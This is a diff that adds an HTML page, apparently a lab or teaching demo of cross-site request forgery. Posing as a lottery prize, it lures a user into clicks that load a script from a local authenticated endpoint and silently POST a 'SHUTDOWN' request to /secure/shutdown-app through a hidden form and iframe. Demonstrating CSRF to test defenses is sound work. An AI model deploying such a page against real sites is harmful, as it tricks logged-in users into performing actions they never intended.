@@ -1,0 +1,44 @@
+<html>
+<head>
+
+
+</head>
+
+
+<body>
+<h1>Congrats, you won the CSRF Lottery</h1>
+
+<h3 id="who"></h3>
+
+<button onClick="callStupidMethod()" id="prize">You won 500$, if you click me ( you idiot ! )</button>
+
+
+<button onClick="finishIt()" id="grand-prize" style="display: none">Take home the grand prize of 1000000$!</button>
+
+<iframe style="display:none" name="csrf-frame"></iframe>
+<form method="POST" action='http://localhost:8080/secure/shutdown-app' target="csrf-frame" id="csrf-form">
+    <input type="hidden" name="param" value="SHUTDOWN">
+
+</form>
+
+
+</body>
+
+
+<script>
+
+    function callStupidMethod() {
+        var s = document.createElement("script");
+        s.src = "http://localhost:8080/secure/stupid";
+        document.body.appendChild(s);
+        document.getElementById("prize").style.display = 'none';
+        document.getElementById("grand-prize").style.display = 'block';
+    }
+
+    function finishIt() {
+        document.getElementById("csrf-form").submit();
+        alert('You Moron!');
+    }
+</script>
+
+</html>
